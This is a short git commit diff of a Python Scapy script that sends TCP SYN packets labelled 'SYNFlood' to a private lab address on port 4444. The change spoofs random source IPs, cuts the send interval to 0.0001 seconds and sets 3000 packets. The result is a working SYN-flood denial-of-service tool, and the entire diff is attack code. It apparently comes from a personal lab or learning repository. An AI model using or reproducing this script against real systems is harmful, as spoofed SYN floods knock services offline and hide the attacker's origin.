82557cb7cb3bbc89c168018c8b6771b7ae133a43
einik1 <33686965+einik1@users.noreply.github.com>
2019-03-16 13:40:03 +0200

    Add files via upload

--- SYNA3.py
+++ SYNA3.py
@@ -5,10 +5,12 @@ def randomIP():
 	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
 	return ip
 
-topt=[('Timestamp', (10,0))]
-p=IP(dst="192.168.56.1",id=1111,ttl=99)/TCP(sport=RandShort(),dport=4444,seq=12345,ack=1000,window=1000,flags='S',options=topt)/"SYNFlood"
+def pkt():
+    topt=[('Timestamp', (10,0))]
+    p=IP(src=RandIP(),dst="192.168.56.1",id=1111,ttl=99)/TCP(sport=RandShort(),dport=4444,seq=12345,ack=1000,window=1000,flags='S',options=topt)/"SYNFlood"
+    return p
 
-ans,unans=srloop(p,inter=0.3,retry=2,timeout=4)
+ans,unans=srloop(pkt(),inter=0.0001,retry=2,timeout=4,count=3000)
 
 ans.summary()
 unans.summary()
